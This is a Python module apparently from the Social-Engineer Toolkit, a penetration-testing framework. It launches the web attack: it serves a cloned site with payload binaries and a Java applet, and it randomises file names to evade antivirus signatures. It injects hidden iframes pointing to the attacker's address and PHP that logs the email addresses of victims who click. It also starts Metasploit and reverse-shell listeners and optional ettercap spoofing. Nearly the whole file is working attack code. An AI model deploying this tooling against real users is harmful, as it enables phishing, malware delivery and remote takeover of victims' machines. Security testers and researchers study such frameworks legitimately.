#!/usr/bin/env python
# coding=utf-8
import os
import subprocess
import sys

import src.core.setcore as core

# python 3 compatibility
try:
    import thread
except ImportError:
    import _thread as thread
import shutil
import re
import socket
import datetime

import string
import random
import multiprocessing

operating_system = core.check_os()
if operating_system == "posix":
    try:
        import pexpect
    except ImportError:
        core.print_error("python-pexpect is not installed.. some things may not work.")
        core.return_continue()

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

# see if we are tracking emails
track_email = core.check_config("TRACK_EMAIL_ADDRESSES=").lower()

# grab the randomized applet name
applet_name = core.check_options("APPLET_NAME=")
if applet_name == "":
    applet_name = core.generate_random_string(6, 15) + ".jar"
    core.update_options("APPLET_NAME=" + applet_name)

# define if we are using a custom payload
custom = 0
if core.check_options("CUSTOM_EXE="):
    custom = 1
    core.print_status("Note that since you are using a custom payload, you will need to create your OWN listener.")
    core.print_status("SET has no idea what type of payload you are using, so you will need to set this up manually.")
    core.print_status("If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")

    # here we need to modify the java applet to recognize custom attribute
    with  open(os.path.join(core.setdir, "web_clone/index.html")) as fileopen:
        data = fileopen.read()

    with open(os.path.join(core.setdir, "web_clone/index.html.new"), "w") as filewrite:

        # we randomize param name so static sigs cant be used
        goat_random = core.generate_random_string(4, 4)
        data = data.replace('param name="8" value="YES"', 'param name="8" value="{0}"'.format(goat_random))
        filewrite.write(data)

    subprocess.Popen("mv {0} {1}".format(os.path.join(core.setdir, "web_clone/index.html.new"),
                                         os.path.join(core.setdir, "web_clone/index.html")),
                     shell=True).wait()

# set current path
definepath = os.getcwd()

# check os

# set default value for automatic listener
automatic_listener = ""

# specify base msf_path
msf_path = ""

# see if we are using setshell
set_payload = ""
if os.path.isfile(os.path.join(core.setdir, "set.payload")):
    with open(os.path.join(core.setdir, "set.payload")) as fileopen:
        for line in fileopen:
            set_payload = line.rstrip()


##########################################################################
#
# Start of the SET Web Server for multiattack, java applet, etc.
#
##########################################################################

def random_string(minlength=6, maxlength=15):
    length = random.randint(minlength, maxlength)
    letters = string.ascii_letters + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])


def web_server_start():
    # define if use apache or not
    apache = False
    # open set_config here
    apache_check = core.check_config("APACHE_SERVER=").lower()
    if apache_check == "on" or track_email == "on":
        apache_path = core.check_config("APACHE_DIRECTORY=")
        if os.path.isdir(os.path.join(apache_path, "html")):
            os.path.join(apache_path, "html")
        apache = True
        if operating_system == "windows":
            apache = False

    # specify the web port
    web_port = core.check_config("WEB_PORT=")

    # see if exploit requires webdav
    if os.path.isfile(os.path.join(core.setdir, "meta_config")):
        with open(os.path.join(core.setdir, "meta_config")) as fileopen:
            for line in fileopen:
                line = line.rstrip()
                match = re.search("set SRVPORT 80", line)
                if match:
                    match2 = re.search("set SRVPORT 8080", line)
                    if not match2:
                        web_port = 8080

    # check ip address
    if core.check_options("IPADDR=") != 0:
        ipaddr = core.check_options("IPADDR=")
    else:
        ipaddr = input("Enter your ip address: ")

    # unless we create template  do self
    template = "SELF"
    # Grab custom or set defined
    if os.path.isfile(os.path.join(core.setdir, "site.template")):
        with open(core.setdir, "site.template") as fileopen:
            for line in fileopen:
                line = line.rstrip()
                template_match = re.search("TEMPLATE=", line)
                url_match = re.search("URL=", line)
                if url_match:
                    # define url to clone here
                    url = line.split("=")[1].rstrip()
                if template_match:
                    template = line.split("=")[1]

    # if attach vector isn't set just set a default template
    attack_vector = "nada"
    # grab web attack selection
    if os.path.isfile(os.path.join(core.setdir, "attack_vector")):
        with open(os.path.join(core.setdir, "attack_vector")) as fileopen:
            for line in fileopen:
                attack_vector = line.rstrip()

    # Sticking it to A/V below
    rand_gen = random_string()

    # check multiattack flags here
    multiattack_harv = "off"
    if os.path.isfile(os.path.join(core.setdir, "multi_harvester")):
        multiattack_harv = "on"
    if os.path.isfile(os.path.join(core.setdir, "/multi_tabnabbing")):
        multiattack_harv = "on"

    # If SET is setting up the website for you, get the website ready for
    # delivery
    if template == "SET":
        # change to that directory
        os.chdir("src/html/")
        # remove stale index.html files
        if os.path.isfile("index.html"):
            os.remove("index.html")
        # define files and get ipaddress set in index.html

        if attack_vector == "java":
            with open("index.template") as fileopen, \
                    open("index.html", "w") as filewrite:
                for line in fileopen:
                    match1 = re.search("msf.exe", line)
                    if match1:
                        line = line.replace("msf.exe", rand_gen)
                    match = re.search("ipaddrhere", line)
                    if match:
                        line = line.replace("ipaddrhere", ipaddr)
                    filewrite.write(line)
            # move random generated name
            shutil.copyfile("msf.exe", rand_gen)

        # define browser attack vector here
        if attack_vector == "browser":
            with open("index.template") as fileopen, \
                    open("index.html", "w") as filewrite:
                for line in fileopen:
                    counter = 0
                    match = re.search(applet_name, line)
                    if match:
                        line = line.replace(applet_name, "invalid.jar")
                        filewrite.write(line)
                        counter = 1
                    match2 = re.search("<head>", line)
                    if match2:
                        if web_port != 8080:
                            line = line.replace("<head>",
                                                '<head><iframe src ="http://{0}:8080/" width="100" height="100" scrolling="no"></iframe>'.format(ipaddr))
                            filewrite.write(line)
                            counter = 1
                        if web_port == 8080:
                            line = line.replace(
                                "<head>", '<head><iframe src = "http://{0}:80/" width="100" height="100" scrolling="no" ></iframe>'.format(ipaddr))
                            filewrite.write(line)
                            counter = 1
                    if counter == 0:
                        filewrite.write(line)

    if template == "CUSTOM" or template == "SELF":
        # Bring our files to our directory
        if attack_vector != 'hid' and attack_vector != 'hijacking':
            print(core.bcolors.YELLOW + "[*] Moving payload into cloned website." + core.bcolors.ENDC)
            # copy all the files needed
            if not os.path.isfile(os.path.join(core.setdir, applet_name)):
                shutil.copyfile(os.path.join(definepath, "src/html/Signed_Update.jar.orig"), os.path.join(core.setdir, applet_name))
            shutil.copyfile(os.path.join(core.setdir, applet_name), os.path.join(core.setdir, "web_clone", applet_name))
            if os.path.isfile(os.path.join(definepath, "src/html/nix.bin")):
                nix = core.check_options("NIX.BIN=")
                shutil.copyfile(os.path.join(definepath, "src/html/nix.bin"), os.path.join(core.setdir, "web_clone", nix))
            if os.path.isfile(os.path.join(definepath, "src/html/mac.bin")):
                mac = core.check_options("MAC.BIN=")
                shutil.copyfile(os.path.join(definepath, "src/html/mac.bin"), os.path.join(core.setdir, "web_clone", mac))
            if os.path.isfile(os.path.join(core.setdir, "msf.exe")):
                win = core.check_options("MSF.EXE=")
                shutil.copyfile(os.path.join(core.setdir, "msf.exe"), os.path.join(core.setdir, "web_clone", win))

            # pull random name generation
            core.print_status("The site has been moved. SET Web Server is now listening..")
            rand_gen = core.check_options("MSF_EXE=")
            if rand_gen:
                if os.path.isfile(os.path.join(core.setdir, "custom.exe")):
                    shutil.copyfile(os.path.join(core.setdir, "msf.exe"), os.path.join(core.setdir, "web_clone/msf.exe"))
                    print("\n[*] Website has been cloned and custom payload imported. Have someone browse your site now")
                shutil.copyfile(os.path.join(core.setdir, "web_clone/msf.exe"), os.path.join(core.setdir, "web_clone", rand_gen))

    # if docbase exploit do some funky stuff to get it to work right
    if os.path.isfile(os.path.join(core.setdir, "docbase.file")):
        docbase = (r"""<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
         "http://www.w3.org/TR/html4/frameset.dtd">
        <HTML>
        <HEAD>
        <TITLE></TITLE>
        </HEAD>
        <FRAMESET rows="99%%, 1%%">
        <FRAME src="site.html">
        <FRAME name=docbase noresize borders=0 scrolling=no src="http://{0}:8080">
        </FRAMESET>
        </HTML>""".format(ipaddr))
        if os.path.isfile(os.path.join(core.setdir, "web_clone/site.html")):
            os.remove(os.path.join(core.setdir, "web_clone/site.html"))
        shutil.copyfile(os.path.join(core.setdir, "web_clone/index.html"),
                        os.path.join(core.setdir, "web_clone/site.html"))
        with open(core.setdir + "/web_clone/index.html", "w") as filewrite:
            filewrite.write(docbase)

    ##########################################################################
    #
    # START WEB SERVER STUFF HERE
    #
    ##########################################################################

    if not apache:
        if multiattack_harv == 'off':
            try:
                # specify port listener here
                # specify the path for the SET web directories for the applet
                # attack
                path = os.path.join(core.setdir, "web_clone/")
                try:
                    import src.core.webserver as webserver
                    p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                    p.start()
                except:
                    thread.start_new_thread(webserver.start_server, (web_port, path))

            # Handle KeyboardInterrupt
            except KeyboardInterrupt:
                core.exit_set()

            # Handle Exceptions
            except Exception as e:
                core.log(e)
                print("{0}[!] ERROR: You probably have something running on port 80 already, Apache??"
                      "[!] There was an issue, printing error: {1}{2}".format(core.bcolors.RED, e, core.bcolors.ENDC))
                stop_apache = input("Attempt to stop Apache? y/n: ")
                if stop_apache == "yes" or stop_apache == "y" or stop_apache == "":
                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                    try:
                        # specify port listener here
                        import src.core.webserver as webserver
                        # specify the path for the SET web directories for the
                        # applet attack
                        path = os.path.join(core.setdir + "web_clone")
                        p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                        p.start()

                    except:
                        print("{0}[!] UNABLE TO STOP APACHE! Exiting...{1}".format(core.bcolors.RED, core.bcolors.ENDC))
                        sys.exit()

            # if we are custom, put a pause here to not terminate thread on web
            # server
            if template == "CUSTOM" or template == "SELF":
                custom_exe = core.check_options("CUSTOM_EXE=")
                if custom_exe:
                    while True:
                        # try block inside of loop, if control-c detected, then
                        # exit
                        try:
                            core.print_warning("Note that if you are using a CUSTOM payload. YOU NEED TO CREATE A LISTENER!!!!!")
                            input("\n{0}[*] Web Server is listening. Press Control-C to exit.{1}".format(core.bcolors.GREEN, core.bcolors.ENDC))

                        # handle keyboard interrupt
                        except KeyboardInterrupt:
                            print("{0}[*] Returning to main menu.{1}".format(core.bcolors.GREEN, core.bcolors.ENDC))
                            break

    if apache:
        subprocess.Popen("cp {0} {apache_path};"
                         "cp {1} {apache_path};"
                         "cp {2} {apache_path};"
                         "cp {3} {apache_path};"
                         "cp {4} {apache_path}".format(os.path.join(definepath, "src/html/*.bin"),
                                                       os.path.join(definepath, "src/html/*.html"),
                                                       os.path.join(core.setdir, "web_clone/*"),
                                                       os.path.join(core.setdir, "msf.exe"),
                                                       os.path.join(core.setdir, "*.jar"),
                                                       apache_path=apache_path),
                         shell=True,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE).wait()

        # if we are tracking users
        if track_email == "on":
            now = datetime.datetime.today()
            with open(os.path.join(apache_path, "harvester_{}.txt".format(now)), 'w') as filewrite:
                filewrite.write("")
            subprocess.Popen("chown www-data:www-data '{0}'".format(os.path.join(apache_path, "harvester_{}.txt".format(now))), shell=True).wait()
            # here we specify if we are tracking users and such
            with open(os.path.join(apache_path, "index.html")) as fileopen:
                data = fileopen.read()
            data = data.replace("<body>",
                                "<body>"
                                "<?php $file = 'harvester_{0}.txt'; $queryString = ''; foreach ($_GET as $key => $value) {{ $queryString .= $key . '=' . $value . '&';}}$query_string = base64_decode($queryString);file_put_contents($file, print_r(\"Email address recorded: \" . $query_string . \"\\n\", true), FILE_APPEND);?>\n"
                                "/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */".format(now))
            with open(os.path.join(apache_path, "index.php"), "w") as filewrite:
                filewrite.write(data)
            core.print_status("All files have been copied to {}".format(apache_path))

    ##########################################################################
    #
    # END WEB SERVER STUFF HERE
    #
    ##########################################################################

    if operating_system != "windows":
        # Grab metaspoit path
        msf_path = core.meta_path()


# define if use apache or not
apache = False

# open set_config here
apache_check = core.check_config("APACHE_SERVER=").lower()
if apache_check == "on" or track_email == "on":
    apache_path = core.check_config("APACHE_DIRECTORY=")
    apache = True
    if operating_system == "windows":
        apache = False

web_server = core.check_config("WEB_PORT=")

# setup multi attack options here
multiattack = "off"
if os.path.isfile(os.path.join(core.setdir, "multi_tabnabbing")):
    multiattack = "on"
if os.path.isfile(os.path.join(core.setdir, "multi_harvester")):
    multiattack = "on"

# Grab custom or set defined
template = ""
if os.path.isfile(os.path.join(core.setdir, "site.template")):
    with open(os.path.join(core.setdir, "site.template")) as fileopen:
        for line in fileopen:
            line = line.rstrip()
            match = re.search("TEMPLATE=", line)
            if match:
                line = line.split("=")
                template = line[1]

# Test to see if something is running on port 80, if so throw error
try:
    web_port = core.check_config("WEB_PORT=")
    web_port = int(web_port)
    ipaddr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ipaddr.connect(('127.0.0.1', web_port))
    ipaddr.settimeout(2)
    if ipaddr:
        # if apache isnt running and something is on 80, throw error
        if not apache:
            core.print_error("ERROR:Something is running on port {}. Attempting to see if we can stop Apache...".format(web_port))
            # if we are running windows then flag error (probably IIS or tomcat or something like that)
            if operating_system == "nt":
                core.exit_set()

            # if we are running posix then check to see what the process is first
            if operating_system == "posix":

                # if we detect an apache installation
                if os.path.isfile("/etc/init.d/apache2"):
                    apache_stop = input("[!] Apache may be running, do you want SET to stop the process? [y/n]: ")
                    if apache_stop.lower() == "y" or apache_stop.lower() == "yes":
                        core.print_status("Attempting to stop apache.. One moment..")
                        # stop apache here
                        subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                        try:
                            ipaddr.connect(('localhost', web_port))
                            if ipaddr:
                                core.print_warning("If you want to use Apache, edit the /etc/setoolkit/set.config")
                                core.print_error("Exit whatever is listening and restart SET")
                                core.exit_set()

                        # if it couldn't connect to localhost, we are good to
                        # go and continue forward
                        except:
                            core.print_status("Success! Apache was stopped. Moving forward within SET...")
                    # if we don't want to stop apache then exit SET and flag
                    # user
                    if apache_stop.lower() == "n" or apache_stop.lower() == "no":
                        core.print_warning("If you want to use Apache, edit the /etc/setoolkit/set.config and turn apache on")
                        core.print_error("Exit whatever is lsitening or turn Apache on in set_config and restart SET")
                        core.exit_set()
                else:
                    core.print_warning("If you want to use Apache, edit the /etc/setoolkit/set.config")
                    core.print_error("Exit whatever is listening and restart SET")
                    core.exit_set()

        # if apache is set to run let the user know we are good to go
        if operating_system == "posix":
            if apache:
                try:
                    web_port = core.check_config("WEB_PORT=")
                    web_port = int(web_port)
                    ipaddr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ipaddr.connect(('127.0.0.1', web_port))
                    ipaddr.settimeout(2)
                    if ipaddr:
                        core.print_status("Apache appears to be running, moving files into Apache's home")

                except:
                    core.print_error("Exit whatever is listening and restart SET")
                    core.exit_set()

# except all issues and throw out to here
except Exception as e:

    # if we are using apache
    if apache:
        core.print_error("Error:Apache does not appear to be running.")
        core.print_error("Start it or turn APACHE off in /etc/setoolkit/set.config")
        core.print_status("Attempting to start Apache manually...")
        apache_counter = False

        if os.path.isfile("/etc/init.d/apache2"):
            subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
            apache_counter = True

        if os.path.isfile("/etc/init.d/httpd"):
            subprocess.Popen("/etc/init.d/httpd start", shell=True).wait()
            apache_counter = True

        if not apache_counter:
            core.print_error("ERROR: Unable to start Apache through SET,")
            core.print_error("ERROR: Please turn Apache off in the set_config or turn it on manually!")
            core.print_error("Exiting the Social-Engineer Toolkit...")
            core.exit_set()

# except KeyboardInterrupt
except KeyboardInterrupt:
    core.print_warning("KeyboardInterrupt detected, bombing out to the prior menu.")

# grab metasploit root directory
if operating_system == "posix":
    msf_path = core.meta_path()

# Launch SET web attack and MSF Listener
try:
    if multiattack == "off":
        print((core.bcolors.BLUE + "\n***************************************************"))
        print((core.bcolors.YELLOW + "Web Server Launched. Welcome to the SET Web Attack."))
        print((core.bcolors.BLUE + "***************************************************"))
        print((core.bcolors.PURPLE + "\n[--] Tested on Windows, Linux, and OSX [--]" + core.bcolors.ENDC))
        if apache:
            print((core.bcolors.GREEN + "[--] Apache web server is currently in use for performance. [--]" + core.bcolors.ENDC))

    if os.path.isfile(os.path.join(core.setdir, "meta_config")):
        with open(os.path.join(core.setdir, "meta_config")) as fileopen:
            for line in fileopen:
                line = line.rstrip()
                match = re.search("set SRVPORT 80", line)
                if match:
                    match2 = re.search("set SRVPORT 8080", line)
                    if not match2:
                        if apache:
                            core.print_warning("Apache appears to be configured in the SET (set_config)")
                            core.print_warning("You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
                            core.exit_set()
                        print(core.bcolors.RED + """Since the exploit picked requires port 80 for WebDav, the\nSET HTTP Server port has been changed to 8080. You will need\nto coax someone to your IP Address on 8080, for example\nyou need it to be http://172.16.32.50:8080 instead of standard\nhttp (80) traffic.""")

    web_server_start()
    # if we are using ettercap
    if os.path.isfile(os.path.join(core.setdir, "ettercap")):
        with open(os.path.join(core.setdir, "ettercap")) as fileopen5:
            for line in fileopen5:
                ettercap = line.rstrip()
                # run in background
                ettercap += " &"
                # spawn ettercap or dsniff
                subprocess.Popen(ettercap, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    # if metasploit config is in directory
    if os.path.isfile(os.path.join(core.setdir, "meta_config")):
        core.print_info("Launching MSF Listener...")
        core.print_info("This may take a few to load MSF...")
        # this checks to see if we want to start a listener
        automatic_listener = core.check_config("AUTOMATIC_LISTENER=").lower()
        if automatic_listener != "off":
            # specify if we are using the multi pyinjector
            meta_config = "meta_config"
            if os.path.isfile(os.path.join(core.setdir, "meta_config_multipyinjector")):
                meta_config = "meta_config_multipyinjector"
            # if we arent using a custom payload
            if custom != 1:
                child1 = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(msf_path, "msfconsole"), os.path.join(core.setdir, meta_config)))
            # check if we want to deliver emails or track users that click the
            # link
            webattack_email = core.check_config("WEBATTACK_EMAIL=").lower()
            if webattack_email == "on" or track_email == "on":
                try:
                    core.module_reload(src.phishing.smtp.client.smtp_web)
                except:
                    import src.phishing.smtp.client.smtp_web

        # if we arent using a custom payload
        if custom != 1:
            child1.interact()

    if os.path.isfile(os.path.join(core.setdir, "set.payload")):
        port = core.check_options("PORT=")

        # grab configuration
        with open(os.path.join(core.setdir, "set.payload")) as fileopen:
            for line in fileopen:
                set_payload = line.rstrip()

        if set_payload == "SETSHELL":
            print("\n")
            core.print_info("Launching the SET Interactive Shell...")
            try:
                core.module_reload(src.payloads.set_payloads.listener)
            except:
                import src.payloads.set_payloads.listener
        if set_payload == "SETSHELL_HTTP":
            print("\n")
            core.print_info("Launching the SET HTTP Reverse Shell Listener...")
            try:
                core.module_reload(src.payloads.set_payloads.set_http_server)
            except:
                import src.payloads.set_payloads.set_http_server

        if set_payload == "RATTE":
            core.print_info("Launching the Remote Administration Tool Tommy Edition (RATTE) Payload...")

            # prep ratte if its posix
            if operating_system == "posix":
                subprocess.Popen("chmod +x src/payloads/ratte/ratteserver", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                os.system("src/payloads/ratte/ratteserver {0}".format(port))

            # if not then run it in windows
            if operating_system == "windows":
                if not os.path.isfile(os.path.join(core.setdir, "ratteserver.exe")):
                    shutil.copyfile("../../payloads/ratte/ratteserver.binary", os.path.join(core.setdir, "ratteserver.exe"))
                    shutil.copyfile("../../payloads/ratte/cygwin1.dll", os.path.join(core.setdir, "/cygwin1.dll"))
                    os.system(os.path.join(core.setdir, "ratteserver {0}".format(port)))

# handle errors
except Exception as e:
    core.log(e)

    try:
        if apache:
            input(core.bcolors.ENDC + "\nPress [return] when finished.")
        # child.close()
        child1.close()
        # close ettercap thread, need to launch from here eventually instead of executing
        # an underlying system command.
        if operating_system == "posix":
            subprocess.Popen("pkill ettercap 1> /dev/null 2> /dev/null", shell=True).wait()
            # kill dnsspoof if there
            subprocess.Popen("pkill dnsspoof 1> /dev/null 2> /dev/null", shell=True).wait()
            if apache:
                subprocess.Popen("rm {0};"
                                 "rm {1};"
                                 "rm {2}".format(os.path.join(apache_path, "index.html"),
                                                 os.path.join(apache_path, "Signed*"),
                                                 os.path.join(apache_path, "*.exe")),
                                 shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
    except:
        pass
        # try:
        #     child.close()
        # except:
        #     pass

except KeyboardInterrupt:
    sys.exit(1)

# if we turned automatic listener off
if automatic_listener == "off" or multiattack == "on":

    if automatic_listener == "off":
        core.print_warning("Listener is turned off in /etc/setoolkit/set.config!")
    if automatic_listener == "off" or template == "CUSTOM" or template == "SELF":

        while True:
            try:
                core.print_warning("\n If you used custom imports, ensure you create YOUR OWN LISTENER!\n"
                                   "SET does not know what custom payload you used.")
                pause = input("\nPress {control -c} to return to the main menu when you are finished.")
            except KeyboardInterrupt:
                break

if apache:
    # if we are running apache then prompt to exit this menu
    core.print_status("Everything has been moved over to Apache and is ready to go.")
    core.return_continue()

# we stop the python web server when we are all finished
if not apache:
    # specify the web port
    web_port = core.check_config("WEB_PORT=")
    # stop the web server
    try:
        import src.core.webserver as webserver
    except:
        core.module_reload(src.core.webserver)
    webserver.stop_server(web_port)

# call the cleanup routine
cleanup = core.check_config("CLEANUP_ENABLED_DEBUG=")
if cleanup.lower() != "on":
    core.cleanup_routine()
